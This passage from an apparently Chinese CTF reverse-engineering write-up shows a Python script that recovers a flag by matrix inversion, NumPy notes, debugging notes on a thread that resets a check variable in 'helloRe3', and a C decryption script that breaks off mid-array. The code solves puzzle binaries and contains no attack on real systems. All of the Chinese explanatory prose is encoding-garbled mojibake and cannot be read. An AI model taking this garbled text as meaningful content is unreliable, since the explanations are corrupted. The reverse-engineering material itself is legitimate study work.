v2<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">89</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">107</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>

v2_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v2<span class="token punctuation">[</span><span class="token number">6</span><span class="token operator">*</span>j<span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    v2_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>

v3_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">6</span><span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    v3_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>

<span class="token comment"># print(v2_matrix)</span>
<span class="token comment"># print(v3_matrix)</span>

v2_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>v2_matrix<span class="token punctuation">)</span>
v3_matrix_compute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v3_matrix_compute<span class="token punctuation">.</span>append<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>v3_matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token comment"># print(v2_matrix)</span>
<span class="token comment"># print(np.linalg.inv(v2_matrix))</span>
<span class="token comment"># print(v3_matrix_compute[0])</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v3_matrix_compute<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>v3_matrix_compute<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
    <span class="token comment">#print(v3_matrix_compute[i])</span>
    result <span class="token operator">=</span> np<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>v2_matrix<span class="token punctuation">)</span><span class="token punctuation">,</span>v3_matrix_compute<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">:</span>
            <span class="token comment">#print(j,end = '')</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¯¹äºè„šæœ¬çš„ä¸€ç‚¹markï¼Œå¸Œæœ›ä¸‹æ¬¡èƒ½å¿«ç‚¹å†™å‡ºæ¥ï¼Œè¸©äº†å¤§å‘ï¼Œä¸è¦æ‹¿4è¡€ï¼ŒçœŸçš„æ·¦ã€‚ä¸è¿‡ï¼Œæœ€é‡è¦çš„åº”è¯¥è¿˜æ˜¯çŸ¥è¯†ç‚¹ï¼Œå…¶å®è¿™ç§æ“ä½œå¤æ‚åŒ–ä¸€ç‚¹å°±å˜æˆäº†åŠ å£³ï¼Œé‚£äº›è„±å£³çš„æ“ä½œï¼Œæ­£æ˜¯è¿™ä¸ªè¿›åŒ–ç‰ˆæœ¬ï¼Œå¯èƒ½è¿˜ä¼šç”¨åˆ°ä»€ä¹ˆåŠ¨æ€åº“ï¼Œåœ¨sehä¸Šè®¾ç½®ä¸€ä¸ªåŠ å£³å‡½æ•°ï¼ŒæŠ›å‡ºå¼‚å¸¸å†è„±å£³ç­‰ç­‰(ä»…çŒœæµ‹)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#åˆå§‹åŒ–çŸ©é˜µ</span>
matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">list</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token comment">#çŸ©é˜µä¹˜æ³•</span>
result <span class="token operator">=</span> np<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#çŸ©é˜µç‚¹ä¹˜</span>
result <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#ä¸€ç»´çŸ©é˜µè½¬ç½®</span>
matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>matrix<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
<span class="token comment">#çŸ©é˜µæ±‚é€†</span>
matrix_inv <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>matrix_inv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å†markä¸€æ³¢idc <a href="https://blog.csdn.net/jazrynwong/article/details/84875699">https://blog.csdn.net/jazrynwong/article/details/84875699</a></p>
<p>å…¶å®çœ‹æ–‡æ¡£ä¹Ÿå¯ä»¥,ä¸è¿‡è¿˜æ˜¯ä¸­æ–‡èˆ’æœç‚¹<a href="https://www.hex-rays.com/products/ida/support/idadoc/162.shtml">https://www.hex-rays.com/products/ida/support/idadoc/162.shtml</a></p>
<h4 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h4><p>è·Ÿè¸ªStringOutDebugï¼Œä¹Ÿå°±æ˜¯debuggerå‡½æ•°å°±ä¼šå‘ç°è¿™ä¸ªä¸œè¥¿ï¼Œå¯ä»¥çœ‹è§</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe31.jpg" alt="1"></p>
<p>æ¡†æ¡†ä¸­å¯¹ä¸€ä¸ªå…¨å±€å˜é‡è¿›è¡Œäº†æ”¹å˜ï¼Œå¯è§ï¼Œè¿™é‡Œæ˜¯å…³é”®ï¼Œä½†æ˜¯å‘ç°æˆ‘ä¸€æ—¦æŠŠè¿™åœ°æ–¹å˜æˆ1ï¼Œå®ƒé©¬ä¸Šå°±å˜å›0äº†ã€‚<br>å½“æˆ‘ä»¬è·Ÿè¸ªå†…å­˜æ—¶å€™å‘ç°è¿™ä¸ª&amp;(&amp;addr)[72<em>i][4</em>v16+1]å…¶å®åœ¨å†…å­˜ä¸­ä»£è¡¨ç€å¯¹åº”å­—ç¬¦å¯¹åº”çš„ä¸€ä¸ªæ•°å­—<br>&amp;(&amp;addr)[72<em>i][4</em>v16]åˆ™ä»£è¡¨å†…å­˜ä¸­çš„ä¸€ä¸ªæŒ‡å‘å¯¹åº”å­—ç¬¦çš„æŒ‡é’ˆ</p>
<p>ç›´æ¥åœ¨è¿™ä¸ªåœ°æ–¹ä¸‹ç¡¬ä»¶å†™å…¥æ–­ç‚¹ï¼Œå°±èƒ½çš„åˆ°è¢«æ”¹å˜çš„åŸå› äº†ï¼ŒåŸæ¥æ˜¯ä¸€ä¸ªçº¿ç¨‹æçš„é¬¼ã€‚ä¸è¿‡ä¸ä¸‹æ–­ç‚¹ä¹Ÿèƒ½çŒœæµ‹åˆ°æ˜¯åˆ«çš„çº¿ç¨‹ä¸‹çš„æ‰‹è„šã€‚ä¸è¿‡ä»”ç»†è§‚å¯Ÿä¸€ä¸‹çº¿ç¨‹çš„ä¸€äº›ç‰¹å¾ä¹Ÿèƒ½æ‰¾åˆ°ä¸€äº›ä¸å¯¹åŠ²çš„åœ°æ–¹ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe32.jpg" alt="2"></p>
<p>é™¤äº†ä¸»çº¿ç¨‹ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨ç”¨æˆ·ä»£ç ä¸ŠèŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œè°ƒè¯•è¿‡åä¼šå‘ç°è¿™ä¸ªçº¿ç¨‹çš„æ—¶é—´æ¯”ä¸»çº¿ç¨‹è¿˜é•¿ï¼Œç”±æ­¤å¯è§åº”è¯¥å»åˆ†æä¸€ä¸‹é‚£ä¸ªçº¿ç¨‹çš„å…¥å£ï¼Œä¸å‡ºæ‰€æ–™ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe33.jpg" alt="3"></p>
<p>çœ‹è§é‚£ä¸ªåœ°æ–¹ä¸º0ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨å¾ªç¯é‡Œé¢ä¸æ–­é‡å¤ã€‚ä¸€æ—¦å˜æˆ1ï¼Œä»–å°±å¼€å§‹äº†ï¼ï¼ï¼</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe34.jpg" alt="4"></p>
<p>åœ¨å³è¾¹çš„æ–¹æ¡†ä¸­å…ˆæŠŠæ¯ä¸ªåœ°æ–¹å–åç„¶åå†è¿›å…¥å·¦è¾¹ï¼Œç»è¿‡åŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯åŠ å¯†ï¼Œé™æ€åˆ†æåä¼šå‘ç°ç¬¬äºŒä¸ªæ˜¯æ¯”è¾ƒä¸¤ä¸ªæ˜¯å¦ç›¸ç­‰ã€‚è·Ÿè¿›ç¬¬ä¸€ä¸ªå‡½æ•°åå‘ç°ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªç”Ÿæˆä¸€ä¸ªkeyï¼Œç¬¬äºŒä¸ªæ˜¯åŠ å¯†ï¼Œè€Œkeyä»¥æ˜æ–‡256ä½å­˜åœ¨å†…å­˜ä¸­ï¼Œç›´æ¥dumpä¸‹æ¥å°±å¯ä»¥äº†ã€‚å¾ˆå¥‡æ€ªçš„æ˜¯ä¸ºä»€ä¹ˆæˆ‘dumpäº†å¥½å‡ æ¬¡ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªç»“æœï¼Ÿï¼Ÿç¬¬äºŒå¤©çš„æ—¶å€™dumpä¸‹æ¥çš„keyæ‰èƒ½ç”¨ï¼Œå¾ˆå¥‡æ€ªã€‚å¯èƒ½æ˜¯æˆ‘ä¹‹å‰dumpé”™äº†åœ°æ–¹ï¼Œæå¾—æˆ‘æƒ³åŠå¤©ä»¥ä¸ºæ˜¯åè°ƒè¯•ï¼Œæ¯”è¾ƒè¿™ä¸ªä»£ç </p>
<p>æœ€åè§£å¯†è„šæœ¬ï¼š</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>

<span class="token keyword">void</span> <span class="token function">exchange_a_byte</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> v <span class="token operator">=</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
    <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token operator">*</span>b<span class="token punctuation">;</span>
    <span class="token operator">*</span>b <span class="token operator">=</span> v<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> string_0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x1D</span><span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">,</span><span class="token number">0xA2</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xA5</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0xB6</span><span class="token punctuation">,</span><span class="token number">0xCC</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x7A</span><span class="token punctuation">,</span><span class="token number">0xE4</span><span class="token punctuation">,</span><span class="token number">0x97</span>
                            <span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0xA9</span><span class="token punctuation">,</span><span class="token number">0xBB</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x3E</span><span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span><span class="token number">0xA4</span><span class="token punctuation">,</span><span class="token number">0xD5</span><span class="token punctuation">,</span><span class="token number">0x7D</span><span class="token punctuation">,</span><span class="token number">0xFE</span><span class="token punctuation">,</span><span class="token number">0x4B</span>
                            <span class="token punctuation">,</span><span class="token number">0x3A</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x8F</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xB8</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x2B</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0xBD</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0xDC</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x2A</span>
                            <span class="token punctuation">,</span><span class="token number">0xBF</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xB1</span><span class="token punctuation">,</span><span class="token number">0xC3</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x3F</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xFD</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xE0</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0xCF</span><span class="token punctuation">,</span><span class="token number">0x57</span>
                            <span class="token punctuation">,</span><span class="token number">0x0E</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0xB4</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x86</span><span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0x8C</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span><span class="token number">0xB0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0xDF</span><span class="token punctuation">,</span><span class="token number">0x7E</span>
                            <span class="token punctuation">,</span><span class="token number">0xD4</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0xF2</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x5D</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x2E</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x01</span>
                            <span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0xAC</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x8D</span><span class="token punctuation">,</span><span class="token number">0xDD</span><span class="token punctuation">,</span><span class="token number">0xC1</span><span class="token punctuation">,</span><span class="token number">0xB2</span><span class="token punctuation">,</span><span class="token number">0xE9</span><span class="token punctuation">,</span><span class="token number">0xFA</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0xE2</span><span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token punctuation">,</span><span class="token number">0x1A</span><span class="token punctuation">,</span><span class="token number">0x0D</span>
                            <span class="token punctuation">,</span><span class="token number">0xC8</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xA8</span><span class="token punctuation">,</span><span class="token number">0xB5</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0xA6</span><span class="token punctuation">,</span><span class="token number">0x1E</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0xC6</span>
                            <span class="token punctuation">,</span><span class="token number">0xAA</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0xD6</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xA7</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0xFB</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x1B</span><span class="token punctuation">,</span><span class="token number">0xE3</span><span class="token punctuation">,</span><span class="token number">0x45</span>
                            <span class="token punctuation">,</span><span class="token number">0xAB</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x4A</span><span class="token punctuation">,</span><span class="token number">0xDB</span><span class="token punctuation">,</span><span class="token number">0xB7</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0xD3</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0xEE</span>
                            <span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0x4F</span><span class="token punctuation">,</span><span class="token number">0x7C</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0xAE</span><span class="token punctuation">,</span><span class="token number">0x9A</span><span class="token punctuation">,</span><span class="token number">0xEA</span><span class="token punctuation">,</span><span class="token number">0x8A</span><span class="token punctuation">,</span><span class="token number">0xC5</span><span class="token punctuation">,</span><span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0xF8</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xD9</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x31</span>
                            <span class="token punctuation">,</span><span class="token number">0xB3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x5B</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0xF9</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x3B</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x3D</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0xED</span><span class="token punctuation">,</span><span class="token number">0x70</span>
                            <span class="token punctuation">,</span><span class="token number">0x7F</span><span class="token punctuation">,</span><span class="token number">0x0A</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0xD1</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0xAF</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0xEB</span><span class="token punctuation">,</span><span class="token number">0xF5</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0xF1</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x43</span>
                            <span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0x95</span><span class="token punctuation">,</span><span class="token number">0xA3</span><span class="token punctuation">,</span><span class="token number">0xE8</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">0x9D</span><span class="token punctuation">,</span><span class="token number">0xBC</span><span class="token punctuation">,</span><span class="token number">0xCA</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0xA1</span><span class="token punctuation">,</span><span class="token number">0xF0</span><span class="token punctuation">,</span><span class="token number">0xF7</span><span class="token punctuation">,</span><span class="token number">0xCE</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0x55</span>
                            <span class="token punctuation">,</span><span class="token number">0x6F</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xFC</span><span class="token punctuation">,</span><span class="token number">0xD0</span><span class="token punctuation">,</span><span class="token number">0xCB</span><span class="token punctuation">,</span><span class="token number">0x9F</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x6A</span><span class="token punctuation">,</span><span class="token number">0x9B</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x2D</span>
                            <span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xBE</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0xA0</span><span class="token punctuation">,</span><span class="token number">0x0B</span><span class="token 